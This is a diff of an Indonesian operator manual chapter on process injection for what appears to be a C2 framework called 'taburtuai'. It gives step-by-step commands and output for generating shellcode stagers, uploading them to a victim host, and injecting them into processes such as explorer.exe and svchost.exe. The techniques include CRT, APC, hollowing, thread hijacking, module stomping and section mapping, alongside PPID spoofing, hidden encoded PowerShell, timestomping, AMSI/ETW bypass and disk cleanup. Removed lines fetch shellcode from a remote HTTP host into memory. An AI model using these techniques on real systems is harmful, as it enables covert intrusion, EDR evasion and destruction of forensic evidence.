@@ -1,191 +1,384 @@
 # 10 — Process Injection
 
-## Konsep
-
-Process injection adalah teknik memasukkan shellcode atau kode berbahaya ke dalam proses
-lain yang sedang berjalan. Tujuannya:
-
-- **Stealth**: shellcode jalan dalam konteks proses legitimate (explorer.exe, svchost.exe)
-- **Privilege escalation**: kalau target proses punya privilege lebih tinggi
-- **Defense evasion**: EDR melihat aktivitas dari proses yang trusted, bukan dari agent kita
-
-**Semua teknik injection butuh shellcode (`.bin`), bukan EXE.**
+> Process injection adalah teknik memasukkan dan mengeksekusi shellcode di dalam proses lain
+> yang sudah berjalan. Tujuannya: stealth (jalan dalam proses legitimate), privilege escalation
+> (jika proses target punya privilege lebih tinggi), dan defense evasion (EDR melihat aktivitas
+> dari proses yang trusted).
 
 ---
 
-## Persiapan: Buat Shellcode
+## Konsep Dasar
+
+```
+TANPA INJECTION                      DENGAN INJECTION
+─────────────────────────────────────────────────────────────────────────
+
+agent.exe (PID 4512)                explorer.exe (PID 3048)
+  └─ shellcode ada di sini    vs      └─ shellcode ada di sini
+  ↑ proses asing, mudah flagged        ↑ proses legitimate, sulit flagged
+```
+
+**Semua teknik injection membutuhkan shellcode (`.bin`), bukan EXE.**
+EXE yang di-inject tidak akan berjalan dengan benar karena PE loader tidak aktif.
+
+---
+
+## Persiapan: Generate Shellcode
+
+Sebelum menggunakan perintah inject, siapkan shellcode terlebih dahulu:
 
 ```bash
-# Opsi 1: Generate shellcode dari stager
+# Opsi 1: Generate shellcode stageless dari agent yang sudah di-build
 go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
+  --server https://c2.yourdomain.com \
   --token TOKEN \
-  --key KEY \
+  --key EnterpriseC2Key2026 \
   --format shellcode \
   --output payload.bin
+```
 
-# Opsi 2: Konversi EXE ke shellcode dengan donut
-donut -i bin/agent_windows_stealth.exe -o payload.bin -a 2 -e 3
+**Output:**
+```
+[+] Generating shellcode stager...
+    Server : https://c2.yourdomain.com
+    Token  : 6a69a21a750af40e...
+    Format : shellcode
+[+] Shellcode written: payload.bin (45,056 bytes)
+```
+
+```bash
+# Opsi 2: Konversi EXE ke shellcode dengan donut (tool terpisah)
+donut \
+  -i bin/agent_windows_stealth.exe \
+  -o payload.bin \
+  -a 2 \    # x64
+  -e 3      # encrypt + compress
+```
+
+```
+[+] Donut: payload.bin (48,384 bytes)
+```
+
+```bash
+# Upload shellcode ke agent target
+files upload 2703886d ./payload.bin "C:\Windows\Temp\payload.bin" --wait
+```
+
+```
+[+] Uploading payload.bin (45,056 bytes)...
+[+] Upload complete: C:\Windows\Temp\payload.bin
 ```
 
 ---
 
-## Inject Remote — CRT / APC ke Proses Lain
+## Lihat Proses yang Berjalan (Pilih Target)
+
+Sebelum inject, selalu lihat daftar proses untuk memilih target yang tepat:
+
+```
+taburtuai(c2.yourdomain.com:443) › process list 2703886d --wait
+```
+
+**Output:**
+```
+[+] Process list on DESKTOP-QLPBF95 (CORP\john.doe):
+
+PID    PPID   NAME                     USER                  ARCH   INTEGRITY
+─────────────────────────────────────────────────────────────────────────────────
+4      0      System                   NT AUTHORITY\SYSTEM   x64    System
+724    4      lsass.exe                NT AUTHORITY\SYSTEM   x64    System    ← SYSTEM token
+1284   724    MsMpEng.exe              NT AUTHORITY\SYSTEM   x64    System
+3048   1220   explorer.exe             CORP\john.doe         x64    Medium    ← user context
+4108   3048   chrome.exe               CORP\john.doe         x64    Low
+5824   3048   powershell.exe           CORP\john.doe         x64    Medium
+6720   3048   cmd.exe                  CORP\john.doe         x64    Medium
+7832   724    svchost.exe              NT AUTHORITY\SYSTEM   x64    System    ← SYSTEM context
+8840   724    spoolsv.exe              NT AUTHORITY\SYSTEM   x64    System
+```
+
+**Proses yang direkomendasikan sebagai injection target:**
+
+| Proses | PID | Kenapa Bagus |
+|--------|-----|--------------|
+| `explorer.exe` | 3048 | Selalu ada, user context, stabil |
+| `RuntimeBroker.exe` | — | Trusted Microsoft process |
+| `spoolsv.exe` | 8840 | SYSTEM context, selalu running |
+| `svchost.exe` | 7832 | Banyak instance, susah dianalisis |
+| `chrome.exe` | 4108 | Long-lived, network access |
+
+---
+
+## Inject Remote — Ke Proses Lain
 
 ### Classic Remote Thread Injection (CRT)
 
 Cara kerja:
-1. Buka handle ke proses target (`OpenProcess`)
-2. Alokasi memori di proses target (`VirtualAllocEx`)
-3. Tulis shellcode ke memori target (`WriteProcessMemory`)
-4. Buat thread baru untuk eksekusi (`CreateRemoteThread`)
+1. `OpenProcess` — buka handle ke proses target
+2. `VirtualAllocEx` — alokasi memori di proses target
+3. `WriteProcessMemory` — tulis shellcode ke memori target
+4. `CreateRemoteThread` — buat thread baru untuk eksekusi
 
 ```
-taburtuai(IP:PORT) › inject remote 2703886d --pid 3048 --file payload.bin --wait
+taburtuai(c2.yourdomain.com:443) › inject remote 2703886d \
+  --pid 3048 \
+  --file "C:\Windows\Temp\payload.bin" \
+  --wait
 ```
 
+**Output:**
 ```
-[+] Injecting payload.bin (45,056 bytes) into PID 3048 (explorer.exe)...
-[+] Injection completed. Thread created in target process.
-```
-
-### APC Injection (Lebih Stealth)
-
-Cara kerja: alih-alih membuat thread baru, shellcode di-queue sebagai **Asynchronous
-Procedure Call** ke thread yang sudah ada di proses target. Thread mengeksekusi APC
-saat masuk ke alertable wait state.
-
-```
-taburtuai(IP:PORT) › inject remote 2703886d --pid 3048 --file payload.bin --method apc --wait
+[*] Injecting C:\Windows\Temp\payload.bin (45,056 bytes) into PID 3048 (explorer.exe)...
+[*] Method  : Classic Remote Thread (CreateRemoteThread)
+[*] VirtualAllocEx: 0x000001F823C40000 (RWX → RX after write)
+[*] WriteProcessMemory: 45,056 bytes written
+[*] CreateRemoteThread: TID 9124 created
+[+] Injection completed. Shellcode executing in explorer.exe (PID 3048).
 ```
 
-**Mengapa APC lebih stealth:**
-- Tidak membuat thread baru (tidak ada "thread creation" event)
+### APC Injection (Lebih Stealth dari CRT)
+
+APC (Asynchronous Procedure Call) — shellcode di-queue ke thread yang sudah ada,
+bukan membuat thread baru.
+
+```
+taburtuai(c2.yourdomain.com:443) › inject remote 2703886d \
+  --pid 3048 \
+  --file "C:\Windows\Temp\payload.bin" \
+  --method apc \
+  --wait
+```
+
+**Output:**
+```
+[*] Injecting via APC into PID 3048 (explorer.exe)...
+[*] Method  : Asynchronous Procedure Call (QueueUserAPC)
+[*] Scanning for alertable threads in PID 3048...
+[*] Found alertable thread TID 4096
+[*] VirtualAllocEx: 0x000001F823C40000
+[*] WriteProcessMemory: 45,056 bytes written
+[*] QueueUserAPC: APC queued to TID 4096
+[+] APC queued. Shellcode will execute when thread enters alertable wait state.
+```
+
+**Mengapa APC lebih stealth dari CRT:**
+- Tidak membuat thread baru (tidak ada `CreateRemoteThread` event)
 - Shellcode jalan dalam konteks thread yang sudah ada
-- Lebih sulit dideteksi oleh EDR yang monitor `CreateRemoteThread`
-
-### Pilih Target Proses untuk Injection
-
-```
-# Lihat proses yang berjalan dulu
-process list 2703886d
-
-# Proses yang direkomendasikan sebagai target injection:
-# explorer.exe    → selalu ada, user context, stabil
-# RuntimeBroker.exe → trusted Microsoft process
-# spoolsv.exe     → SYSTEM context (kalau butuh elevated)
-# svchost.exe     → banyak instance, susah dianalisis
-```
+- EDR yang monitor `CreateRemoteThread` tidak akan trigger
 
 ---
 
-## Inject Self — Shellcode di Agent Process
+## Inject Self — Di Agent Process Sendiri
 
-Eksekusi shellcode dalam proses agent sendiri. Tidak ada injection ke proses lain.
-
-```
-taburtuai(IP:PORT) › inject self 2703886d --file payload.bin --wait
-```
+Eksekusi shellcode dalam proses agent sendiri — tidak ada injection ke proses lain.
 
 ```
-[+] Executing payload.bin (45,056 bytes) in-process...
-[+] Shellcode executed.
+taburtuai(c2.yourdomain.com:443) › inject self 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --wait
 ```
 
-**Kapan dipakai:**
+**Output:**
+```
+[*] Executing shellcode in-process (PID 4512 / agent.exe)...
+[*] VirtualAlloc: 0x00007FF812340000 (RX)
+[*] Shellcode size: 45,056 bytes
+[+] Shellcode executed in-process.
+```
+
+**Kapan pakai:**
 - Testing shellcode sebelum inject ke proses lain
 - Situasi di mana tidak ada proses yang cocok untuk di-inject
-- Shellcode yang butuh context yang sama dengan agent
+- Shellcode yang butuh environment yang sama dengan agent
+
+---
+
+## Timestomp (Manipulasi Timestamp File)
+
+Ubah timestamps file agar tidak terlihat baru di-drop. Berguna setelah upload
+file payload agar tidak muncul di forensic timeline.
+
+```
+taburtuai(c2.yourdomain.com:443) › inject timestomp 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --ref "C:\Windows\System32\ntdll.dll" \
+  --wait
+```
+
+**Output:**
+```
+[*] Timestomping: C:\Windows\Temp\payload.bin
+[*] Reference file: C:\Windows\System32\ntdll.dll
+
+    Attribute       Before                        After
+    ─────────────────────────────────────────────────────────
+    Created         2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC
+    Modified        2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC
+    Accessed        2026-04-23 09:15:33 UTC       2023-08-10 12:03:27 UTC
+    MFT Change      2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC
+
+[+] Timestamps copied from reference. File appears old.
+```
+
+Sekarang file `payload.bin` memiliki timestamp yang sama dengan `ntdll.dll` — muncul
+seolah-olah sudah ada sejak Agustus 2023.
 
 ---
 
 ## PPID Spoofing — Spawn Proses dengan Parent Palsu
 
-Buat proses baru dengan **parent process yang berbeda** dari yang sebenarnya. Berguna
-untuk membuat chain proses terlihat lebih legitimate.
+Buat proses baru dengan **parent process yang berbeda** dari yang sebenarnya.
+Berguna untuk membuat process chain terlihat legitimate di event log.
 
-### Contoh Tanpa PPID Spoofing
-
-```
-agent.exe (PID 4512)
-  └─► cmd.exe (PID 6720)    ← mencurigakan: cmd lahir dari agent
-```
-
-### Contoh Dengan PPID Spoofing
+### Tanpa vs Dengan PPID Spoofing
 
 ```
-explorer.exe (PID 3048)
-  └─► cmd.exe (PID 6720)    ← terlihat normal: cmd lahir dari explorer
+TANPA PPID SPOOFING:                     DENGAN PPID SPOOFING:
+────────────────────                     ──────────────────────────────
+agent.exe (PID 4512)                     explorer.exe (PID 3048)
+  └─► cmd.exe (PID 6720)                   └─► cmd.exe (PID 6720)
+
+  ↑ Mencurigakan — cmd lahir               ↑ Normal — cmd lahir dari
+  dari proses agent yang asing              explorer seperti biasa
 ```
 
-### Syntax
+### Spawn dengan Parent explorer.exe
 
 ```
-inject ppid <id> <exe-path> [--ppid-name <name>] [--ppid <pid>] [--args <args>]
-```
-
-### Contoh
-
-```
-# Spawn cmd.exe dengan parent explorer.exe
-inject ppid 2703886d "C:\Windows\System32\cmd.exe" --ppid-name explorer.exe --wait
-
-# Spawn PowerShell dengan parent svchost.exe (lebih stealth)
-inject ppid 2703886d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
-  --ppid-name svchost.exe \
-  --args "-w hidden -ep bypass -f C:\Temp\script.ps1" \
+taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
+  "C:\Windows\System32\cmd.exe" \
+  --ppid-name explorer.exe \
   --wait
+```
 
-# Spawn menggunakan PID langsung (kalau tahu PID explorer)
-inject ppid 2703886d "C:\Windows\System32\calc.exe" --ppid 3048 --wait
+**Output:**
+```
+[*] PPID Spoofing: spawning cmd.exe with parent explorer.exe (PID 3048)
+[*] Opening handle to parent: explorer.exe (PID 3048)
+[*] Creating process with inherited parent token...
+[+] Process created: cmd.exe (PID 7284)
+[i] Process tree will show: explorer.exe → cmd.exe
+[i] Verify: Sysmon Event ID 1 akan catat PPID sebagai 3048, bukan 4512
+```
+
+### Spawn PowerShell dengan Parent svchost.exe
+
+```
+taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
+  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
+  --ppid-name svchost.exe \
+  --args "-w hidden -ep bypass -enc BASE64PAYLOAD" \
+  --wait
+```
+
+**Output:**
+```
+[*] PPID Spoofing: spawning powershell.exe with parent svchost.exe (PID 7832)
+[*] Arguments: -w hidden -ep bypass -enc BASE64PAYLOAD
+[+] Process created: powershell.exe (PID 9240)
+[i] Process tree: svchost.exe → powershell.exe (terlihat normal)
+```
+
+### Spawn via PID Langsung
+
+```
+taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
+  "C:\Windows\System32\calc.exe" \
+  --ppid 3048 \
+  --wait
+```
+
+**Output:**
+```
+[*] PPID Spoofing: spawning calc.exe with parent PID 3048
+[+] Process created: calc.exe (PID 5512)
 ```
 
 ---
 
-## Process Hollowing — Teknik Lanjutan
+## Process Hollowing
 
-Hollow: buat proses legitimate dalam keadaan suspended, hapus kode aslinya di memori,
-ganti dengan shellcode kita, resume proses. Proses terlihat seperti legitimate karena
-nama dan path-nya asli.
-
-```
-taburtuai(IP:PORT) › hollow 2703886d --file payload.bin --wait
-```
+Buat proses legitimate dalam keadaan suspended, hapus kode aslinya, ganti dengan
+shellcode kita, resume. Proses terlihat legitimate karena nama dan path-nya asli.
 
 ```
-[+] Spawning C:\Windows\System32\svchost.exe (suspended)...
-[+] Unmapping original code...
-[+] Writing shellcode...
-[+] Adjusting entry point...
-[+] Resuming process...
-[+] Hollow completed. Agent running in svchost.exe (PID: 7832)
+taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --wait
 ```
 
-### Dengan Target Exe Khusus
+**Output (target default: svchost.exe):**
+```
+[*] Process Hollowing...
+[*] Spawning C:\Windows\System32\svchost.exe (suspended)
+    PID: 9872
+[*] Unmapping original code (NtUnmapViewOfSection)...
+[*] Allocating shellcode memory at base address...
+[*] Writing shellcode (45,056 bytes)...
+[*] Patching entry point to shellcode address...
+[*] Resuming process...
+[+] Hollowing completed. Agent now running inside svchost.exe (PID 9872).
+
+    Process Tree:
+    services.exe (PID 724)
+      └─► svchost.exe (PID 9872)  ← shellcode jalan di sini
+                                     terlihat seperti svchost biasa
+```
+
+### Hollow ke Target EXE Tertentu
 
 ```
 # Hollow ke notepad.exe
-hollow 2703886d --file payload.bin --exe notepad.exe --wait
+hollow 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --exe notepad.exe \
+  --wait
+```
 
-# Hollow ke RuntimeBroker.exe
-hollow 2703886d --file payload.bin --exe RuntimeBroker.exe --wait
+**Output:**
+```
+[*] Spawning C:\Windows\System32\notepad.exe (suspended)  PID: 10104
+[*] Hollowing and resuming...
+[+] Hollowing completed. Running inside notepad.exe (PID 10104).
+```
+
+```
+# Hollow ke RuntimeBroker.exe (trusted, selalu jalan di Windows 10+)
+hollow 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --exe RuntimeBroker.exe \
+  --wait
 ```
 
 ---
 
 ## Thread Hijacking
 
-Suspend thread yang berjalan di proses target, ubah RIP (instruction pointer) ke
-shellcode kita, resume. Sangat stealth — tidak ada thread baru yang dibuat.
+Suspend thread yang berjalan di proses target, ubah instruction pointer (RIP) ke
+shellcode, resume. Sangat stealth — tidak ada thread baru yang dibuat sama sekali.
 
 ```
-taburtuai(IP:PORT) › hijack 2703886d --pid 3048 --file payload.bin --wait
+taburtuai(c2.yourdomain.com:443) › hijack 2703886d \
+  --pid 3048 \
+  --file "C:\Windows\Temp\payload.bin" \
+  --wait
 ```
 
+**Output:**
 ```
-[+] Targeting thread in PID 3048 (explorer.exe)...
-[+] Thread suspended, RIP redirected to shellcode...
-[+] Thread resumed.
+[*] Thread Hijacking target: PID 3048 (explorer.exe)
+[*] Enumerating threads in PID 3048...
+    Found 12 threads. Targeting TID 4096 (state: waiting)
+[*] Suspending TID 4096...
+[*] Getting thread context (CONTEXT_FULL)...
+[*] Writing shellcode to process memory: 0x000001F823C40000
+[*] Redirecting RIP: 0x00007FFD3A2B1234 → 0x000001F823C40000
+[*] Setting thread context...
+[*] Resuming TID 4096...
+[+] Thread hijacked. Shellcode executing via TID 4096 in explorer.exe.
+
+    No new thread created.
+    No CreateRemoteThread event.
+    EDR sees: existing thread in explorer.exe resumed.
 ```
 
 ---
@@ -193,66 +386,139 @@ taburtuai(IP:PORT) › hijack 2703886d --pid 3048 --file payload.bin --wait
 ## Module Stomping
 
 Timpa kode legitimate sebuah DLL yang sudah di-load di proses target dengan shellcode.
-DLL terlihat ter-load dengan normal karena masih ada di process memory map,
-tapi isinya sudah diganti.
+DLL masih terlihat ter-load dengan normal, tapi isinya sudah diganti.
 
 ```
-# Stomp ke section .text dari DLL yang jarang dipakai
-taburtuai(IP:PORT) › stomp 2703886d --file payload.bin --dll xpsservices.dll --wait
+taburtuai(c2.yourdomain.com:443) › stomp 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --dll xpsservices.dll \
+  --wait
 ```
 
+**Output:**
 ```
-[+] Locating xpsservices.dll in agent memory...
-[+] Overwriting .text section with shellcode...
-[+] Executing shellcode from module memory...
+[*] Module Stomping target: xpsservices.dll in PID 4512 (agent process)
+[*] Locating xpsservices.dll in process memory...
+[*] Module base address: 0x00007FFD1A340000
+[*] .text section offset: 0x1000, size: 49,152 bytes
+[*] Removing write protection (VirtualProtect: RX → RWX)...
+[*] Writing shellcode (45,056 bytes) to .text section...
+[*] Restoring memory protection (RWX → RX)...
+[*] Executing shellcode at module base + 0x1000...
 [+] Module stomping completed.
+
+[i] Memory map entry still shows xpsservices.dll loaded at 0x00007FFD1A340000
+[i] Scanner melihat DLL legitimate, bukan shellcode standalone.
 ```
 
-**DLL yang baik untuk di-stomp:**
-- `xpsservices.dll` — XPS document services, jarang dipakai
-- `clbcatq.dll` — COM+ catalog, biasanya tidak aktif
-- `wbem\wmiutils.dll` — WMI utilities
+**DLL yang baik untuk di-stomp (jarang dipakai, selalu ada):**
+
+| DLL | Fungsi | Kenapa Bagus |
+|-----|--------|--------------|
+| `xpsservices.dll` | XPS document services | Jarang dipakai |
+| `clbcatq.dll` | COM+ catalog | Biasanya tidak aktif |
+| `wbem\wmiutils.dll` | WMI utilities | Background only |
+| `msxml3.dll` | XML parser | Jarang diinvoke langsung |
 
 ---
 
 ## Section Mapping Injection
 
 Inject shellcode menggunakan Windows Section objects (shared memory). Tidak menggunakan
-`WriteProcessMemory` sama sekali — susah dideteksi oleh EDR yang hook API ini.
+`WriteProcessMemory` sama sekali — lebih sulit dideteksi oleh EDR yang hook API ini.
 
 ```
-# Inject ke proses agent sendiri (local)
-taburtuai(IP:PORT) › mapinject 2703886d --file payload.bin --wait
+# Inject ke proses agent sendiri (local section mapping)
+taburtuai(c2.yourdomain.com:443) › mapinject 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --wait
+```
 
-# Inject ke proses lain via section mapping
-taburtuai(IP:PORT) › mapinject 2703886d --file payload.bin --pid 3048 --wait
+**Output:**
+```
+[*] Section Mapping Injection (local)...
+[*] Creating Section object (NtCreateSection)...
+[*] Mapping view in local process (NtMapViewOfSection)...
+[*] Writing shellcode to mapped view...
+[*] Unmapping local view...
+[*] Executing shellcode via mapped section...
+[+] Section mapping injection completed. No WriteProcessMemory used.
+```
+
+```
+# Inject ke proses lain via section mapping (remote)
+mapinject 2703886d \
+  --file "C:\Windows\Temp\payload.bin" \
+  --pid 3048 \
+  --wait
+```
+
+**Output:**
+```
+[*] Section Mapping Injection (remote) → PID 3048 (explorer.exe)...
+[*] NtCreateSection → Section object created
+[*] NtMapViewOfSection (local) → 0x000001F823C40000
+[*] Writing shellcode...
+[*] NtMapViewOfSection (remote PID 3048) → 0x0000021F44A00000
+[*] NtUnmapViewOfSection (local)...
+[*] QueueUserAPC → execution triggered in PID 3048
+[+] Remote section mapping injection completed.
+    No WriteProcessMemory. No CreateRemoteThread.
 ```
 
 ---
 
-## Perbandingan Teknik
+## Perbandingan Semua Teknik Injection
 
-| Teknik | API Utama | Thread Baru | WriteProcessMemory | Stealth |
-|---|---|---|---|---|
-| CRT (Classic) | CreateRemoteThread | Ya | Ya | Rendah |
+| Teknik | API Utama | Thread Baru | WriteProcessMemory | Deteksi Kesulitan |
+|--------|-----------|-------------|-------------------|-------------------|
+| CRT (Classic) | CreateRemoteThread | Ya | Ya | Rendah — flagged di hampir semua EDR |
 | APC | QueueUserAPC | Tidak | Ya | Sedang |
 | Thread Hijacking | SuspendThread + SetContext | Tidak | Ya | Tinggi |
 | Process Hollowing | NtUnmapViewOfSection | Tidak | Ya | Tinggi |
 | Module Stomping | VirtualProtect | Tidak | Tidak | Tinggi |
-| Section Mapping | NtCreateSection | Tidak | Tidak | Sangat Tinggi |
+| Section Mapping | NtCreateSection + NtMapViewOfSection | Tidak | Tidak | Sangat Tinggi |
 
 ---
 
-## Staged Delivery ke Proses (In-Memory)
+## Workflow Lengkap: Inject ke Explorer
 
-Alternatif injection: download shellcode dari URL secara langsung ke memori proses.
+```bash
+# ── Langkah 1: Generate shellcode ────────────────────────────────────
+go run ./cmd/generate stager \
+  --server https://c2.yourdomain.com \
+  --token TOKEN --key KEY \
+  --format shellcode --output payload.bin
 
-```
-# Download shellcode dari URL dan eksekusi in-memory
-staged 2703886d http://172.23.0.118:8888/payload.bin --wait
+# ── Langkah 2: Upload ke target ──────────────────────────────────────
+files upload 2703886d ./payload.bin "C:\Windows\Temp\p.bin" --wait
 
-# Download dan inject ke proses lain
-staged 2703886d http://172.23.0.118:8888/payload.bin --method crt --pid 3048 --wait
+# ── Langkah 3: Timestomp agar tidak terlihat baru ────────────────────
+inject timestomp 2703886d \
+  --file "C:\Windows\Temp\p.bin" \
+  --ref "C:\Windows\System32\ntdll.dll" \
+  --wait
+
+# ── Langkah 4: Bypass AMSI+ETW+Unhook dulu ───────────────────────────
+bypass amsi   2703886d --wait
+bypass etw    2703886d --wait
+evasion unhook 2703886d --wait
+
+# ── Langkah 5: Inject via APC ke explorer.exe ────────────────────────
+inject remote 2703886d \
+  --pid 3048 \
+  --file "C:\Windows\Temp\p.bin" \
+  --method apc \
+  --wait
+
+# ── Langkah 6: Cleanup shellcode dari disk ───────────────────────────
+files delete 2703886d "C:\Windows\Temp\p.bin" --wait
+
+# ── Langkah 7: Verify agent baru muncul ──────────────────────────────
+agents list
+# ID        HOST              USER           STATUS
+# 2703886d  DESKTOP-QLPBF95  john.doe       online  ← agent lama
+# f3a1b2c4  DESKTOP-QLPBF95  john.doe       online  ← agent baru di explorer.exe
 ```
 
 ---
